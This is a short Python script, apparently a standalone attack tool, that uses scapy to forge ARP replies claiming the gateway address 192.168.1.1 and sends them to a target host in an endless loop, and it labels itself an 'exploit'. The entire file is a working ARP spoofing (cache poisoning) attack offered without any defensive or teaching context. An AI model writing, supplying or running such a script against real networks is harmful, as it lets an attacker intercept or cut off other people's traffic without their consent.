from scapy.all import Ether, ARP, sendp
import socket
import time

def main(target):
    # print(f"target: {target} type: {type(target)}")
    spoof_ip = "192.168.1.1"
    trg = target.split(',')
    packet = Ether(dst=trg[1]) / ARP(
        op=2,
        pdst=trg[0],
        hwdst=trg[1],
        psrc=spoof_ip
    )
    try:
        while True:
            sendp(packet, verbose=False)
            #print(f"Sent spoofed ARP reply to {trg[0]}")
            #time.sleep()
    except KeyboardInterrupt:
        print("stoping exploit...")
        